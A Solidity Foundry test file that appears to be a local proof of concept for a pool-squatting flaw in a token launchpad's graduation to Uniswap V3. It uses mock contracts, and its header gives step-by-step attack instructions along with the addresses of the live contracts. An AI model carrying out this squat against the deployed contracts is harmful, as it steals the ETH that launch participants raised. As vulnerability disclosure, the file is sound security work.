// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/**
 * Self-contained proof of Robinlaunch graduation pool-squat root cause.
 * Mirrors BondingCurve._graduate / DirectFactory._createPool behaviour:
 *   createAndInitializePoolIfNecessary(token0, token1, fee, sqrtPriceX96)
 *   + mint with amount0Min = 0, amount1Min = 0
 *   + NO post-init slot0() price check
 *
 * SAFE / LOCAL ONLY. No mainnet state touched.
 *
 * Attack (permissionless, zero tokens required to pre-create V3 pool):
 * 1. Predict token/WETH ordering for a not-yet-graduated (or about-to-launch) token.
 * 2. Attacker calls UniswapV3Factory.createPool + initialize at a fake sqrtPriceX96.
 * 3. Graduation / DirectFactory launch calls createAndInitializePoolIfNecessary —
 *    pool already exists → intended sqrtPriceX96 is IGNORED.
 * 4. Mint with min amounts 0 deposits liquidity at the attacker price.
 * 5. Attacker arb / extract value against mispriced full-range LP; victims lose raise ETH.
 *
 * Live contracts (Robinhood Chain 4663) — verified source on Blockscout:
 *   Factory v8:      0x108eB6D67c079bEb1EF328850a88c2BbDB4617ea
 *   DirectFactory v3:0x52afeBDb95Cda3C221eB415Abb9cEE051E3Ca082
 *   BondingCurve:    deployed per token (logic in Factory source additional_files)
 */

/// Minimal stand-in for Uniswap V3 factory + pool initialize semantics
contract MockV3Pool {
    address public token0;
    address public token1;
    uint24 public fee;
    uint160 public sqrtPriceX96;
    bool public initialized;

    constructor(address t0, address t1, uint24 f) {
        token0 = t0;
        token1 = t1;
        fee = f;
    }

    function initialize(uint160 price) external {
        require(!initialized, "already init");
        sqrtPriceX96 = price;
        initialized = true;
    }
}

contract MockV3Factory {
    mapping(bytes32 => address) public getPool;

    function createPool(address t0, address t1, uint24 fee) external returns (address pool) {
        require(t0 < t1, "order");
        bytes32 key = keccak256(abi.encodePacked(t0, t1, fee));
        require(getPool[key] == address(0), "exists");
        pool = address(new MockV3Pool(t0, t1, fee));
        getPool[key] = pool;
    }
}

/// Mirrors INonfungiblePositionManager.createAndInitializePoolIfNecessary
contract MockNPM {
    MockV3Factory public immutable factory;

    constructor(MockV3Factory f) {
        factory = f;
    }

    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external returns (address pool) {
        require(token0 < token1);
        bytes32 key = keccak256(abi.encodePacked(token0, token1, fee));
        pool = factory.getPool(key);
        if (pool == address(0)) {
            pool = factory.createPool(token0, token1, fee);
            MockV3Pool(pool).initialize(sqrtPriceX96);
        } else if (!MockV3Pool(pool).initialized()) {
            MockV3Pool(pool).initialize(sqrtPriceX96);
        }
        // CRITICAL: if already initialized, sqrtPriceX96 argument is silently ignored
    }
}

/// Slice of BondingCurve graduation that is vulnerable
contract VulnerableGraduate {
    MockNPM public immutable npm;
    uint24 public constant UNISWAP_FEE = 10_000;

    event Graduated(address pool, uint160 intendedPrice, uint160 actualPrice);

    constructor(MockNPM n) {
        npm = n;
    }

    function graduate(address token0, address token1, uint160 intendedSqrtPriceX96) external returns (address pool) {
        // EXACT pattern from BondingCurve._graduate / DirectFactory._createPool
        pool = npm.createAndInitializePoolIfNecessary(token0, token1, UNISWAP_FEE, intendedSqrtPriceX96);
        // amount0Min = 0; amount1Min = 0;  // no slippage / price guard on mint
        // NO: require(IUniswapV3Pool(pool).slot0().sqrtPriceX96 == intendedSqrtPriceX96)
        uint160 actual = MockV3Pool(pool).sqrtPriceX96();
        emit Graduated(pool, intendedSqrtPriceX96, actual);
        require(actual != 0, "no price");
    }
}

contract PoolSquatLogicTest is Test {
    MockV3Factory factory;
    MockNPM npm;
    VulnerableGraduate grad;

    address token = address(0xBEEF);
    address weth = address(0xCAFE);
    address attacker = address(0xA11CE);

    uint160 constant FAKE_PRICE = 1 << 96; // 1:1-ish toy
    uint160 constant HONEST_PRICE = 2 << 96; // different from attacker

    function setUp() public {
        // ensure token0 < token1 ordering like Uniswap
        if (token > weth) {
            (token, weth) = (weth, token);
        }
        factory = new MockV3Factory();
        npm = new MockNPM(factory);
        grad = new VulnerableGraduate(npm);
    }

    function test_poolSquat_attackerPriceSurvivesGraduation() public {
        // 1. Attacker pre-creates + initializes pool at FAKE price (needs ZERO of the meme token)
        vm.prank(attacker);
        address pool = factory.createPool(token, weth, 10_000);
        vm.prank(attacker);
        MockV3Pool(pool).initialize(FAKE_PRICE);

        assertEq(MockV3Pool(pool).sqrtPriceX96(), FAKE_PRICE);

        // 2. Honest graduation intends HONEST_PRICE (from realEth/tokenBalance ratio)
        address returned = grad.graduate(token, weth, HONEST_PRICE);

        // 3. Pool is the pre-created one; intended price was ignored
        assertEq(returned, pool);
        assertEq(MockV3Pool(pool).sqrtPriceX96(), FAKE_PRICE, "attacker price stuck - squat succeeded");
        assertTrue(MockV3Pool(pool).sqrtPriceX96() != HONEST_PRICE, "honest price discarded");

        console.log("VULN CONFIRMED: graduation used attacker sqrtPriceX96");
        console.logUint(uint256(FAKE_PRICE));
        console.log("honest intended was");
        console.logUint(uint256(HONEST_PRICE));
    }

    function test_withoutSquat_honestPriceApplies() public {
        // Control: no pre-create → honest price lands
        address pool = grad.graduate(token, weth, HONEST_PRICE);
        assertEq(MockV3Pool(pool).sqrtPriceX96(), HONEST_PRICE);
    }
}
